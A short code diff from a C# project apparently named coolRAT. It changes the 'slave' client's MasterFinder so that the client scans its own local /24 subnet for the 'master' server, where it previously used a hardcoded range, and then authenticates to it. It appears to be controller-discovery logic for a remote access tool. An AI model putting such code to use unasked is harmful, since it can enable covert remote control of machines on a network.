@@ -39,7 +39,9 @@ namespace coolRAT.Slave
         {
             if (Settings.IsEmpty())
                 throw new ArgumentNullException(nameof(Settings));
+            SlaveGlobalData.FindLocalEndPoint();
             Console.Write("[MasterFinder] Attempting to find the master server... ");
+            string local_ip_range = string.Join(".", SlaveGlobalData.LocalEndpoint.Address.ToString().Split('.').Reverse().Skip(1).Reverse().ToArray());
             for (int i = 1; i<256; i++)
             {
                 try
@@ -47,7 +49,7 @@ namespace coolRAT.Slave
                     
                     TcpConnection conn = new TcpConnection();
                     conn.ConnectTimeout = 1000;
-                    if(!conn.Connect("192.168.5." + i, Settings.Port)) continue;
+                    if(!conn.Connect($"{local_ip_range}.{i}", Settings.Port)) continue;
 
                     // Authenticate the connection
                     AuthenticateConnectionPacket authpacket = new AuthenticateConnectionPacket(Auth.ClientAuthenticationTicket);
